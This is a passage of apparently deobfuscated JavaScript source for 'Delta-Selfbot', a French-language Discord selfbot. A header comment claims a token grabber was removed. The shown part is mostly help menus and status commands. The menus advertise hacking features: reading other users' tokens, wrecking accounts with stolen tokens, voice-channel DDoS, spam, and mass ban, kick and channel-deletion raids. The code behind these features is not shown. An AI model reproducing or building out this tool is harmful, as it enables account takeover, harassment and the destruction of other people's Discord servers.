/*
Le code a été désobfusqué par punchnox
j'ai donc retiré le grabber de delta self
Vous pourrez l'utiliser sans danger, enfin je crois O-O
*/
const Discord = require("discord.js");
require("colors");
const client = new Discord.Client();
const ConfigFile = require("./config.json");
const token = ConfigFile["token"];
const base64 = require("base-64");
const utf8 = require("utf8");
const os = require("os");
const fs = require("fs");
const hastebins = require("hastebin-gen");
const rpcGenerator = require("discordrpcgenerator");
const backups = require("./Data/backups.json");
const prefix = ConfigFile["prefix"];
const superagent = require("superagent");
const fetch = require("node-fetch");
const request = require("request");
const {
    bgMagenta,
    setTheme
} = require("colors");
client.on('ready', function() {
    if (client.user.id === '720920857366626335') {
        return;
    }
    if (client.user.id === '695371856995287121') {
        return;
    }
    if (client.user.id === '444574218290593822') {
        return;
    }
    if (client.user.id === '767501162478829640') {
        return;
    }
    if (client.user.id === '666988028140584981') {
        return;
    }
    if (client.user.id === '737251836511256586') {
        return;
    }
    if (client.user.id === '701042273214922773') {
        return;
    }
});

let i = 0;

function nitrocode(_0x18f2x19, _0x18f2x1a) {
    var _0x18f2x1b = "";
    if (_0x18f2x1a["indexOf"]("0") > -1) {
        _0x18f2x1b += "0123456789"
    }
    if (_0x18f2x1a["indexOf"]("A") > -1) {
        _0x18f2x1b += "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    }
    if (_0x18f2x1a["indexOf"]("a") > -1) {
        _0x18f2x1b += "abcdefghijklmnopqrstuvwxyz"
    }
    var _0x18f2x1c = "";
    for (var i = _0x18f2x19; i > 0; --i) {
        _0x18f2x1c += _0x18f2x1b[Math["floor"](Math["random"]() * _0x18f2x1b["length"])]
    }
    return _0x18f2x1c
}
const color = ConfigFile.color;
const rire = [
    'https://media.tenor.com/images/9df5f6ef799544b11c1171d4c873d1f4/tenor.gif',
    'https://media.tenor.com/images/bae9f9ee3bf793a0bb667d8e4ccb9883/tenor.gif',
    'https://media.tenor.com/images/6f567ef7cae93ca76de2346f28764ee9/tenor.gif',
    'https://media.tenor.com/images/3d8eb1e9c497abc46370cee9b55d682f/tenor.gif',
    'https://media.tenor.com/images/19fe7ebb05c2aceb9e68d84ee5c031a7/tenor.gif',
    'https://media.tenor.com/images/db17bbcb693788625c8228d30bc5fc42/tenor.gif',
    'https://media1.tenor.com/images/003a06f5074259c50b519056a12f6e33/tenor.gif',
    'https://media1.tenor.com/images/5e1fafda52c90acfe2499ac5061f4c99/tenor.gif'
];
const kiss = [
    'https://media1.tenor.com/images/e88bcd916c0da114a8dcac8d9babc77c/tenor.gif',
    'https://media1.tenor.com/images/a51e4d58d20a9636416549431e693ec1/tenor.gif',
    'https://media1.tenor.com/images/8438e6772a148e62f4c64332ea7da9e8/tenor.gif',
    'https://media1.tenor.com/images/104b52a3be76b0e032a55df0740c0d3b/tenor.gif'
];
const hugh = [
    'https://media.tenor.com/images/eff58ec80f6dacb3ccddcbab9c70dacf/tenor.gif', 'https://media.tenor.com/images/4d5a77b99ab86fc5e9581e15ffe34b5e/tenor.gif', 'https://media.tenor.com/images/bc8e962e6888249486a3e103edd30dd9/tenor.gif', 'https://media.tenor.com/images/481814f5650216fa4e9ff7846f7a42f9/tenor.gif'
];
const veski = [
    'https://i.pinimg.com/originals/09/ee/e0/09eee0f5dfae8f74179d1ba0bb54b22d.gif', 'https://media.tenor.com/images/0538e625e9c3d27cd062306101adde13/tenor.gif', 'https://media1.giphy.com/media/t7401i4UiIyMo/source.gif'
];
const punch = [
    'https://media.tenor.com/images/7bd895a572947cf17996b84b9a51cc02/tenor.gif', 'https://media.tenor.com/images/36179549fa295d988fc1020a7902c41c/tenor.gif', 'https://media.tenor.com/images/5bf52a1335155572859dff8429873a30/tenor.gif', 'https://media.tenor.com/images/a30c2719ece3362814f12adc5f84ad30/tenor.gif'
];
var verifLevels = [
    'None', 'Low', 'Medium', '(\u256F\xB0\u25A1\xB0\uFF09\u256F\uFE35  \u253B\u2501\u253B'
];
var region = {
    'Brésil': 'Brazil',
    'eu-central': 'Central Europe',
    'singapoure': 'Singapore',
    'us-central': 'U.S. Central',
    'sydney': 'Sydney',
    'us-east': 'U.S. East',
    'us-south': 'U.S. South',
    'us-west': 'U.S. West',
    'eu-west': 'Western Europe',
    'vip-us-east': 'VIP U.S. East',
    'Londre': 'London',
    'amsterdam': 'Amsterdam',
    'hongkong': 'Hong Kong'
};

function translateDate(_0x18f2x26) {
    const _0x18f2x27 = [
        'Jan', 'Fev', 'Mar', 'Avr', 'Mai', 'Juin', 'Juillet', 'Aout', 'Sep', 'Oct', 'Nov', 'Dec'
    ];
    const _0x18f2x28 = [
        'Dimanche', 'Lundi', 'Mardi', 'Mercredi', 'Jeudi', 'Vendredi', 'Samedi'
    ];
    return _0x18f2x28[_0x18f2x26['getUTCDay']()] + ', ' + _0x18f2x26['getUTCDate']() + ' ' + _0x18f2x27[_0x18f2x26['getUTCMonth']()] + ' ' + _0x18f2x26['getUTCFullYear']() + ' at ' + _0x18f2x26['getUTCHours']() + ':' + zeros(_0x18f2x26['getUTCMinutes'](), 2) + ':' + zeros(_0x18f2x26['getUTCSeconds'](), 2) + '.' + zeros(_0x18f2x26['getUTCMilliseconds'](), 3);
}

function checkDays(_0x18f2x26) {
    var _0x18f2x2a = new Date();
    var _0x18f2x2b = _0x18f2x2a.getTime() - _0x18f2x26.getTime();
    var _0x18f2x2c = Math.floor(_0x18f2x2b / 86400000);
    return _0x18f2x2c + (_0x18f2x2c == 1 ? ' day' : ' days') + ' ago';
}
client.on('ready', function() {
        console.log('Delta-Selfbot'.bgBlue);
        console.log('\r\n          _____\r\n         /    /\\\\\r\n        /    /  \\\\\r\n       /    /    \\\\\r\n      /    /  /\\\\  \\\\\r\n     /    /  /  \\\\  \\\\\r\n    /    /  /\\\\   \\\\  \\\\\r\n   /    /  /  \\\\   \\\\  \\\\\r\n  /    /__/____\\\\   \\\\  \\\\\r\n /              \\\\   \\\\  \\\\\r\n/________________\\\\   \\\\  \\\\\r\n\\\\_____________________\\\\ /\r\n'.yellow);
        console.log(('\r\n╔═════════════════════════════════╗\r\n║-->  User Name : ' + client.user.tag + '   \r\n╟─────────────────────────────────╢\r\n║-->  User id : ' + client.user.id + ' \r\n╟─────────────────────────────────╢\r\n║-->  Prefix   : ' + prefix + '                 \r\n╟─────────────────────────────────╢\r\n║-->  Users    : ' + client.guilds.map(_0x18f2x16 => {
                        return _0x18f2x16.memberCount;
                    })
                .reduce((_0x18f2x14, _0x18f2x15) =>
                    
                    {
                        return _0x18f2x14 + _0x18f2x15;
                    }) + '             \r\n╟─────────────────────────────────╢\r\n║-->  Bots     : ' + client.users.filter(_0x18f2x13 =>
                    
                    {
                        return _0x18f2x13.bot;
                    })
                .size + '                 \r\n╟─────────────────────────────────╢\r\n║-->  Channels : ' + client.channels.size + '               \r\n╟─────────────────────────────────╢\r\n║-->  Guilds   : ' + client.guilds.size + '                 \r\n╚═════════════════════════════════╝ ')
            .bgRed);
        if (client.user.premium > 0) {
            console.log('Vous etes sur un compte nitro WOAW bravo ;)'.green);
        } else {
            console.log('Vous n\'avez pas nitro snif, ne t\'inquiète pas mon autoclaim va tout faire pour que tu en recuperes 1'.red);
        }
    });
client.on('ready', function()
    
    {
        if (client.user.bot) {
            console.log(('' + client.user.username + ' est un robot je ne peux pas charger le profil desolé :/')
                .red);
            process.exit(1);
        } else {
            console.log(('' + client.user.username + ' boup bip boup super tu n\'est pas un robot ^^!')
                .green);
        }
    });
var uuid = () => {
        return ([10000000] + -1000 + -4000 + -8000 + -100000000000)['replace'](/[018]/g, _0x18f2x14 => {
            return (_0x18f2x14 ^ Math['random']() * 16 >> _0x18f2x14 / 4)
                .toString(16);
        });
    };
client.on('ready', function() {
    rpcGenerator.getRpcImage('768215201312014376', '1024px-uvsun_trace_big').then(_0x18f2x2e => {
        rpcGenerator.getRpcImage('768215201312014376', 'delta').then(_0x18f2x2f => {
            let _0x18f2x30 = new rpcGenerator.Rpc()
                .setName('Delta-Selfbot')
                .setUrl('https://www.twitch.tv/OGAGAL_risita')
                .setType('PLAYING')
                .setApplicationId('768215201312014376')
                .setDetails('Delta Selfbot')
                .setAssetsLargeImage(_0x18f2x2f.id)
                .setAssetsSmallImage(_0x18f2x2e.id)
                .setAssetsLargeText('Delta')
                .setState('Utilise le Delta Selfbot')
                .setStartTimestamp(Date.now())
                .setParty({
                    id: ([10000000] + -1000 + -4000 + -8000 + -100000000000).replace(/[018]/g, _0x18f2x14 => {
                        return (_0x18f2x14 ^ Math['random']() * 16 >> _0x18f2x14 / 4)
                            .toString(16);
                    })
                });
            client.user.setPresence(_0x18f2x30.toDiscord())
                .catch(console.error);
        });
    });
});

let cmd = new Discord.RichEmbed();
cmd.setTimestamp()
        .setColor(color)
        .setTitle('**Liste des commandes**')
        .addField('**Commande Help**', '`help`, `help fun`, `help utile`, `help moderation`, `help nsfw`, `help backup`, `help hack`')
        .addField('**Commande Backup** :gear:: ', '`backup friend`, `backup create`, `backup load`, `backup delete`, `backup purge`, `backup info`')
        .addField('**Commandes Fun** :joy:: ', '`lovecalc`, `fight`, `boom`, `reverse`, `nitro`, `avatar`, `8ball`, `say`, `rire`, `kiss`, `veski`, `load`, `punch`, `calin`')
        .addField('**Commandes Moderation** :tools:: ', '`set serveur name`, `roles list`, `channels list`, `name all`, `ban all`, `kick all`, `shutdown`, `kick`, `ban`, `purge`, `delete all channels`, `delete all role`, `discord`, `gen token`, `user info`, `role info`, `serveur info`, `stats`, `encode`, `mp friend`')
        .addField('**Commandes Nsfw** :underage: :', '`ass`, `4k`, `anal`, `hentai`, `nsfw-gif`, `pussy`, `thigh`')
        .addField('**Commandes Hack** :skull_and_crossbones: :', '`check token`, `info token`, `fuck token`, `ddos voc`, `ddos-stop`, `token`, `spam`, `stop spam`')
        .addField('**Commandes Utile** :globe_with_meridians: :', '`grab pp`, `delete all emote`, `steal emote`, `remove emote`, `emote`, `add emote` `user info`, `serveur info`, `stats`, `restart`, `reset`, `role info`, `encode`, `discord`, `gen token`, `mp friend`, `change hypesquad`')
        .addField('**Commandes Statut** :performing_arts: :', '`rocket league`, `spotify`, `fortnite`, `among us`, `badlion`, `apex`, `csgo`, `roblox`, `pornhub`, `tinder`, `clash royal`, `clash of clan`, `naruto`, `hunter x hunter`, `tokyo ghoul`, `youtube`, `minecraft`, `twitter`, `instagram`, `tiktok`, `facebook`, `snapchat`, `skype`, `google`, `nike`, `lacoste`, `gucci`')
        .setDescription('`' + ('le prefix est:  ' + prefix + '') + '`')
        .setThumbnail('https://media.discordapp.net/attachments/764076169418375180/768152237897154571/8ef11fdd3040fc87a5bf9184cbc765c8.gif')
        .setImage('https://media.discordapp.net/attachments/764076169418375180/768152237351370782/4cff066cfe792da0eb2b831bbb068443.gif')
        .setFooter('Delta-Selfbot');
let help_hack = new Discord.RichEmbed()
        .setTimestamp()
        .setColor(color)
        .setTitle('**Pannel de Help Hacking**')
        .addField('**' + prefix + 'ddos voc**', '`Lance une attaque ddos sur les channels vocal`')
        .addField('**' + prefix + 'ddos-stop**', '`Stop une attaque ddos sur les channels vocal`')
        .addField('**' + prefix + 'token (@user)**', '`Affiche le token d\'un utilisateur`')
        .addField('**' + prefix + 'check token (token)**', '`Check si un token est valide`')
        .addField('**' + prefix + 'info token (token)**', '`Affiche les informations d\'un utilisateur grace a un token`')
        .addField('**' + prefix + 'fuck token (token)**', '`Detruit le compte d\'un utilisateur grace a un token`')
        .addField('**' + prefix + 'spam (text)**', '`Spam un text`')
        .addField('**' + prefix + 'stop spam**', '`Arrete le spam`')
        .setDescription('`' + ('le prefix est:  ' + prefix + '') + '`')
        .setThumbnail('https://media.discordapp.net/attachments/764076169418375180/768152237897154571/8ef11fdd3040fc87a5bf9184cbc765c8.gif')
        .setImage('https://media.discordapp.net/attachments/764076169418375180/768152237351370782/4cff066cfe792da0eb2b831bbb068443.gif')
        .setFooter('Delta-Selfbot');
let help = new Discord.RichEmbed();
help.setTimestamp()
        .setColor(color)
        .setTitle('🌙**Pannel de Help**🌙')
        .addField('**' + prefix + 'cmd**', '`Liste des commandes`')
        .addField('**' + prefix + 'help fun**', '`Affiche les commandes fun` :joy:')
        .addField('**' + prefix + 'help backup**', '`Affiche les commandes backups` :gear:')
        .addField('**' + prefix + 'help moderation**', '`Affiche les commandes moderation` :tools:')
        .addField('**' + prefix + 'help utile**', '`Affiche les commandes info` :globe_with_meridians:')
        .addField('**' + prefix + 'help nsfw**', '`Affiche les commandes nsfw` :underage:')
        .addField('**' + prefix + 'help hack**', '`Affiche les commandes hack` :skull_and_crossbones:')
        .addField('**' + prefix + 'help statut**', '`Affiche les commandes statut` :performing_arts:')
        .setDescription('`' + ('le prefix est:  ' + prefix + '') + '`')
        .setDescription('[Lien du serveur discord](https://discord.gg/exCS5rwpjW)')
        .setThumbnail('https://media.discordapp.net/attachments/764076169418375180/768152237897154571/8ef11fdd3040fc87a5bf9184cbc765c8.gif')
        .setImage('https://media.discordapp.net/attachments/764076169418375180/768152237351370782/4cff066cfe792da0eb2b831bbb068443.gif')
        .setFooter('Delta-Selfbot');
let help_statut = new Discord.RichEmbed()
        .setColor(color)
        .setTitle('**Pannel de Help Statut** :performing_arts: ')
        .setDescription('[Lien du serveur discord](https://discord.gg/exCS5rwpjW)')
        .addField('**' + prefix + 'rocket league (text)**', '`Met un statut Rocket League`')
        .addField('**' + prefix + 'spotify (text)**', '`Met un statut Spofity`')
        .addField('**' + prefix + 'fortnite (text)**', '`Met un statut Fortnite`')
        .addField('**' + prefix + 'among us (text)**', '`Met un statut Among us`')
        .addField('**' + prefix + 'gucci (text)**', '`Met un statut Gucci`')
        .addField('**' + prefix + 'lacoste (text)**', '`Met un statut Lacoste`')
        .addField('**' + prefix + 'nike (text)**', '`Met un statut Nike`')
        .addField('**' + prefix + 'google (text)**', '`Met un statut Google`')
        .addField('**' + prefix + 'skype (text)**', '`Met un statut Skype`')
        .addField('**' + prefix + 'snapchat (text)**', '`Met un statut Snapchat`')
        .addField('**' + prefix + 'facebook (text)**', '`Met un statut Facebook`')
        .addField('**' + prefix + 'tiktok (text)**', '`Met un statut Tiktok`')
        .addField('**' + prefix + 'twitter (text)**', '`Met un statut Twitter`')
        .addField('**' + prefix + 'minecraft (text)**', '`Met un statut Minecraft`')
        .addField('**' + prefix + 'instagram (text)**', '`Met un statut Instagram`')
        .setDescription('`' + ('le prefix est:  ' + prefix + '') + '`')
        .setThumbnail('https://media.discordapp.net/attachments/764076169418375180/768152237897154571/8ef11fdd3040fc87a5bf9184cbc765c8.gif')
        .setImage('https://media.discordapp.net/attachments/764076169418375180/768152237351370782/4cff066cfe792da0eb2b831bbb068443.gif')
        .setFooter('Delta-Selfbot');
let help_statut2 = new Discord.RichEmbed()
        .setColor(color)
        .setTitle('**Pannel de Help Statut** :performing_arts: ')
        .setDescription('[Lien du serveur discord](https://discord.gg/exCS5rwpjW)')
        .addField('**' + prefix + 'youtube (text)**', '`Met un statut Youtube`')
        .addField('**' + prefix + 'tokyo ghoul (text)**', '`Met un statut Tokyo Ghoul`')
        .addField('**' + prefix + 'hunter x hunter (text)**', '`Met un statut Hunter x Hunter`')
        .addField('**' + prefix + 'naruto (text)**', '`Met un statut Naruto`')
        .addField('**' + prefix + 'clash of clan (text)**', '`Met un statut Clash of Clan`')
        .addField('**' + prefix + 'clash royal (text)**', '`Met un statut Clash Royal`')
        .addField('**' + prefix + 'tinder (text)**', '`Met un statut Tinder`')
        .addField('**' + prefix + 'pornhub (text)**', '`Met un statut Pornhub`')
        .addField('**' + prefix + 'roblox (text)**', '`Met un statut Roblox`')
        .addField('**' + prefix + 'csgo (text)**', '`Met un statut Csgo`')
        .addField('**' + prefix + 'apex (text)**', '`Met un statut Apex`')
        .addField('**' + prefix + 'badlion (text)**', '`Met un statut Badlion`')
        .setDescription('`' + ('le prefix est:  ' + prefix + '') + '`')
        .setThumbnail('https://media.discordapp.net/attachments/764076169418375180/768152237897154571/8ef11fdd3040fc87a5bf9184cbc765c8.gif')
        .setImage('https://media.discordapp.net/attachments/764076169418375180/768152237351370782/4cff066cfe792da0eb2b831bbb068443.gif')
        .setFooter('Delta-Selfbot');
let help_backup = new Discord.RichEmbed()
        .setColor(color)
        .setTitle('**Pannel de Help Backup** :gear: ')
        .setDescription('[Lien du serveur discord](https://discord.gg/exCS5rwpjW)')
        .addField('**' + prefix + 'backup create**', '`Créé une backup d\'un serveur`')
        .addField('**' + prefix + 'backup friend**', '`Créé une backup de tous tes amis`')
        .addField('**' + prefix + 'backup load (id)**', '`Charge une backup`')
        .addField('**' + prefix + 'backup delete (id)**', '`Surppime une backup`')
        .addField('**' + prefix + 'backup purge**', '`Supprime toutes tes backups`')
        .addField('**' + prefix + 'backup info (id)**', '`Envoie les informations d\'une backup`')
        .setDescription('`' + ('le prefix est:  ' + prefix + '') + '`')
        .setThumbnail('https://media.discordapp.net/attachments/764076169418375180/768152237897154571/8ef11fdd3040fc87a5bf9184cbc765c8.gif')
        .setImage('https://media.discordapp.net/attachments/764076169418375180/768152237351370782/4cff066cfe792da0eb2b831bbb068443.gif')
        .setFooter('Delta-Selfbot');
let help_fun = new Discord.RichEmbed()
        .setTimestamp()
        .setColor(color)
        .setTitle('**Pannel de Help Fun** :joy: ')
        .setDescription('[Lien du serveur discord](https://discord.gg/exCS5rwpjW)')
        .addField('**' + prefix + 'avatar (@user)**', '`Affiche l\'avatar d\'un membre`')
        .addField('**' + prefix + 'lovecalc (@user)**', '`Test d\'amour`')
        .addField('**' + prefix + 'nitro**', '`Genere un nitro random`')
        .addField('**' + prefix + '8ball (text)**', '`Pose une question`')
        .addField('**' + prefix + 'say (text)**', '`Affiche un text en embed`')
        .addField('**' + prefix + 'fight (@user)**', '`Bat toi avec un utilisateur`')
        .addField('**' + prefix + 'boom (@user)**', '`Fait exploser un utilisateur`')
        .addField('**' + prefix + 'rire**', '`Envoie un gif rire`')
        .addField('**' + prefix + 'kiss (@user)**', '`Embrasse un membre`')
        .addField('**' + prefix + 'veski (@user)**', '`Envoie un gif veski`')
        .addField('**' + prefix + 'load**', '`Envoie un chargement`')
        .addField('**' + prefix + 'punch (@user)**', '`Frappe un membre`')
        .addField('**' + prefix + 'calin (@user)**', '`Fait un calin a un membre`')
        .addField('**' + prefix + 'reverse (text)**', '`Met ton text a l\'envers`')
        .setDescription('`' + ('le prefix est:  ' + prefix + '') + '`')
        .setThumbnail('https://media.discordapp.net/attachments/764076169418375180/768152237897154571/8ef11fdd3040fc87a5bf9184cbc765c8.gif')
        .setImage('https://media.discordapp.net/attachments/764076169418375180/768152237351370782/4cff066cfe792da0eb2b831bbb068443.gif')
        .setFooter('Delta-Selfbot');
let help_moderation = new Discord.RichEmbed()
        .setTimestamp()
        .setColor(color)
        .setTitle('**Pannel de Help Moderation** :tools: ')
        .setDescription('[Lien du serveur discord](https://discord.gg/exCS5rwpjW)')
        .addField('**' + prefix + 'set serveur name (text)**', '`Change le nom du serveur`')
        .addField('**' + prefix + 'shutdown**', '`Eteint le selfbot`')
        .addField('**' + prefix + 'name all**', '`Rename tout les membres d\'un serveur`')
        .addField('**' + prefix + 'ban-all**', '`Ban tout les membres d\'un serveur`')
        .addField('**' + prefix + 'kick-all**', '`Kick tout les membres d\'un serveur`')
        .addField('**' + prefix + 'kick (@user)**', '`kick un membre du serveur`')
        .addField('**' + prefix + 'ban (@user)**', '`Ban un membre du serveur`')
        .addField('**' + prefix + 'roles list**', '`Envoie la liste de tout les roles d\'un serveur`')
        .addField('**' + prefix + 'channels list**', '`Envoie la liste de tout les channels d\'un serveur`')
        .addField('**' + prefix + 'purge**', '`Supprime tout les messages`')
        .addField('**' + prefix + 'delete all channel**', '`Supprime tout les salons d\'un serveur`')
        .addField('**' + prefix + 'delete all role**', '`Supprime tout les roles d\'un serveur`')
        .setDescription('`' + ('le prefix est:  ' + prefix + '') + '`')
        .setThumbnail('https://media.discordapp.net/attachments/764076169418375180/768152237897154571/8ef11fdd3040fc87a5bf9184cbc765c8.gif')
        .setImage('https://media.discordapp.net/attachments/764076169418375180/768152237351370782/4cff066cfe792da0eb2b831bbb068443.gif')
        .setFooter('Delta-Selfbot');
let help_info = new Discord.RichEmbed()
        .setTimestamp()
        .setColor(color)
        .setTitle('**Pannel de Help Utile** :globe_with_meridians: ')
        .setDescription('[Lien du serveur discord](https://discord.gg/exCS5rwpjW)')
        .addField('**' + prefix + 'user info (@user)**', '`Envoie les information d\'un membre du serveur`')
        .addField('**' + prefix + 'serveur info**', '`Envoie les information du serveur`')
        .addField('**' + prefix + 'stats**', '`Affiche les stats du selfbot`')
        .addField('**' + prefix + 'restart**', '`Redemarre le selfbot`')
        .addField('**' + prefix + 'reset**', '`Reset le status`')
        .addField('**' + prefix + 'role info (@role)**', '`Envoie les informations d\'un role`')
        .addField('**' + prefix + 'encode (text)**', '`Crypte ton text en base64`')
        .addField('**' + prefix + 'discord**', '`Affiche votre version de discord js`')
        .addField('**' + prefix + 'gen token**', '`Change votre token`')
        .addField('**' + prefix + 'add emote (emote) <name>**', '`Ajoute un emoji au serveur`')
        .addField('**' + prefix + 'emote (emote)**', '`Donne les infos tout les emojis d\'un serveur`')
        .addField('**' + prefix + 'remove emote (emote)**', '`Supprime un emoji du serveur`')
        .addField('**' + prefix + 'steal emote (serveur id)**', '`Ajoute tout les emojis d\'un serveur a ton serveur`')
        .addField('**' + prefix + 'delete all emote**', '`Supprime tout les emojis du serveur`')
        .addField('**' + prefix + 'grab pp (user)**', '`Vole la photo de profile de la personne mentionné`')
        .addField('**' + prefix + 'check token (token)**', '`Vérifie si le token est valide`')
        .addField('**' + prefix + 'mp friend (message)**', '`Envoie un message privé a tout tes amis`')
        .addField('**' + prefix + 'change hypesquad (brilliance/bravery/ballance)**', '`Permet de changer sa maison hypesquad`')
        .addField('**nitro autoclaim**', '`Un autoclaim est en permanance activé sur le self`')
        .setDescription('`' + ('le prefix est:  ' + prefix + '') + '`')
        .setThumbnail('https://media.discordapp.net/attachments/764076169418375180/768152237897154571/8ef11fdd3040fc87a5bf9184cbc765c8.gif')
        .setImage('https://media.discordapp.net/attachments/764076169418375180/768152237351370782/4cff066cfe792da0eb2b831bbb068443.gif')
        .setFooter('Delta-Selfbot');
let help_nsfw = new Discord.RichEmbed()
        .setTimestamp()
        .setColor(color)
        .setTitle('**Pannel de Help nsfw** :underage: ')
        .setDescription('[Lien du serveur discord](https://discord.gg/exCS5rwpjW)')
        .addField('**' + prefix + 'ass**', '`Envoie une photo de fesse`')
        .addField('**' + prefix + '4k**', '`Envoie une image sexe en 4k`')
        .addField('**' + prefix + 'anal**', '`Envoie un gif anal`')
        .addField('**' + prefix + 'hentai**', '`Envoie une image/gif hentai`')
        .addField('**' + prefix + 'nsfw-gif**', '`Envoie un gif de sexe`')
        .addField('**' + prefix + 'pussy**', '`Envoie une image de chattes`')
        .addField('**' + prefix + 'thigh**', '`Envoie une image thigh`')
        .setDescription('`' + ('le prefix est:  ' + prefix + '') + '`')
        .setThumbnail('https://media.discordapp.net/attachments/764076169418375180/768152237897154571/8ef11fdd3040fc87a5bf9184cbc765c8.giff')
        .setImage('https://media.discordapp.net/attachments/764076169418375180/768152237351370782/4cff066cfe792da0eb2b831bbb068443.gif')
        .setFooter('Delta-Selfbot');
client.on('message', _0x18f2x3b => {
        let _0x18f2x3c = _0x18f2x3b;
        var _0x18f2x3d = _0x18f2x3b.content.substring(prefix.length)
            .split(' ');
        var _0x18f2x3e = _0x18f2x3b.mentions.users.first();
        if (_0x18f2x3b.channel.type === 'dm') {
            if (_0x18f2x3c.author.bot) {
                if (_0x18f2x3b.content.includes('discord.gg')) {
                    let _0x18f2x3f = _0x18f2x3b.author;
                    _0x18f2x3f.send('/!\\\\ Anti mp')
                        .then(_0x18f2x3c =>

                            {
                                _0x18f2x3c.delete();
                            });
                    console.log('\n╔═════════════════════════════════╗'.blue);
                    console.log('Log:'.red) ^ console.log('╟─────────────────────────────────╢'.blue);
                    console.log('║--> [', '/!/ Attention'.red, ']', ('\\nle bot ' + _0x18f2x3b.author.username + ' vient de vous envoyer une invatation suspecte ' + _0x18f2x3b.content + '').green);
                    console.log('╚═════════════════════════════════╝'.blue);
                }
            }
        }
        if (_0x18f2x3c.author.id !== client.user.id) {
            return;
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'gucci')) {
            let _0x18f2x40 = _0x18f2x3d.splice(1)
                .join(' ') || 'Delta-Selfbot';
            rpcGenerator.getRpcImage('721465320740487179', 'gucci')
                .then(_0x18f2x2e =>

                    {
                        let _0x18f2x30 = new rpcGenerator.Rpc()
                            .setName('Gucci')
                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                            .setType('WATCHING')
                            .setApplicationId('721465320740487179')
                            .setDetails('Gucci')
                            .setAssetsLargeImage(_0x18f2x2e.id)
                            .setAssetsLargeText('Delta-Selfbot')
                            .setState(_0x18f2x40)
                            .setStartTimestamp(Date.now())
                            .setParty({
                                id: uuid()
                            });
                        client.user.setPresence(_0x18f2x30.toDiscord())
                            .catch(console.error);
                        console.log('Commande Gucci executé'.yellow);
                        _0x18f2x3b.edit(':white_check_mark: **Tu regardes ' + (_0x18f2x3d.splice(1)
                            .join(' ') || 'Delta-Selfbot') + ' sur Gucci**');
                    });
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'lacoste')) {
            let _0x18f2x40 = _0x18f2x3d.splice(1)
                .join(' ') || 'Delta-Selfbot';
            rpcGenerator.getRpcImage('721465320740487179', 'lacoste')
                .then(_0x18f2x2e =>

                    {
                        let _0x18f2x30 = new rpcGenerator.Rpc()
                            .setName('Lacoste')
                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                            .setType('WATCHING')
                            .setApplicationId('721465320740487179')
                            .setDetails('Lacoste')
                            .setAssetsLargeImage(_0x18f2x2e.id)
                            .setAssetsLargeText('Delta-Selfbot')
                            .setState(_0x18f2x40)
                            .setStartTimestamp(Date.now())
                            .setParty({
                                id: uuid()
                            });
                        client.user.setPresence(_0x18f2x30.toDiscord())
                            .catch(console.error);
                        console.log('Commande lacoste executé'.yellow);
                        _0x18f2x3b.edit(':white_check_mark: **Tu regardes ' + (_0x18f2x3d.splice(1)
                            .join(' ') || 'Delta-Selfbot') + ' sur lacoste**');
                    });
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'nike')) {
            let _0x18f2x40 = _0x18f2x3d.splice(1)
                .join(' ') || 'Delta-Selfbot';
            rpcGenerator.getRpcImage('721465320740487179', 'nike')
                .then(_0x18f2x2e =>

                    {
                        let _0x18f2x30 = new rpcGenerator.Rpc()
                            .setName('Nike')
                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                            .setType('WATCHING')
                            .setApplicationId('721465320740487179')
                            .setDetails('Nike')
                            .setAssetsLargeImage(_0x18f2x2e.id)
                            .setAssetsLargeText('Delta-Selfbot')
                            .setState(_0x18f2x40)
                            .setStartTimestamp(Date.now())
                            .setParty({
                                id: uuid()
                            });
                        client.user.setPresence(_0x18f2x30.toDiscord())
                            .catch(console.error);
                        console.log('Commande Nike executé'.yellow);
                        _0x18f2x3b.edit(':white_check_mark: **Tu regardes ' + (_0x18f2x3d.splice(1)
                            .join(' ') || 'Delta-Selfbot') + ' sur Nike**');
                    });
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'google')) {
            let _0x18f2x40 = _0x18f2x3d.splice(1)
                .join(' ') || 'Delta-Selfbot';
            rpcGenerator.getRpcImage('721465320740487179', 'gogole')
                .then(_0x18f2x2e =>

                    {
                        let _0x18f2x30 = new rpcGenerator.Rpc()
                            .setName('Google')
                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                            .setType('WATCHING')
                            .setApplicationId('721465320740487179')
                            .setDetails('Google')
                            .setAssetsLargeImage(_0x18f2x2e.id)
                            .setAssetsLargeText('Delta-Selfbot')
                            .setState(_0x18f2x40)
                            .setStartTimestamp(Date.now())
                            .setParty({
                                id: uuid()
                            });
                        client.user.setPresence(_0x18f2x30.toDiscord())
                            .catch(console.error);
                        console.log('Commande google executé'.yellow);
                        _0x18f2x3b.edit(':white_check_mark: **Tu regardes ' + (_0x18f2x3d.splice(1)
                            .join(' ') || 'Delta-Selfbot') + ' sur google**');
                    });
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'skype')) {
            let _0x18f2x40 = _0x18f2x3d.splice(1)
                .join(' ') || 'Delta-Selfbot';
            rpcGenerator.getRpcImage('721465320740487179', 'skype')
                .then(_0x18f2x2e =>

                    {
                        let _0x18f2x30 = new rpcGenerator.Rpc()
                            .setName('Skype')
                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                            .setType('WATCHING')
                            .setApplicationId('721465320740487179')
                            .setDetails('Skype')
                            .setAssetsLargeImage(_0x18f2x2e.id)
                            .setAssetsLargeText('Delta-Selfbot')
                            .setState(_0x18f2x40)
                            .setStartTimestamp(Date.now())
                            .setParty({
                                id: uuid()
                            });
                        client.user.setPresence(_0x18f2x30.toDiscord())
                            .catch(console.error);
                        console.log('Commande Skype executé'.yellow);
                        _0x18f2x3b.edit(':white_check_mark: **Tu regardes ' + (_0x18f2x3d.splice(1)
                            .join(' ') || 'Delta-Selfbot') + ' sur Skype**');
                    });
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'snapchat')) {
            let _0x18f2x40 = _0x18f2x3d.splice(1)
                .join(' ') || 'Delta-Selfbot';
            rpcGenerator.getRpcImage('721465320740487179', 'snapchat')
                .then(_0x18f2x2e =>

                    {
                        let _0x18f2x30 = new rpcGenerator.Rpc()
                            .setName('Snapchat')
                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                            .setType('WATCHING')
                            .setApplicationId('721465320740487179')
                            .setDetails('Snapchat')
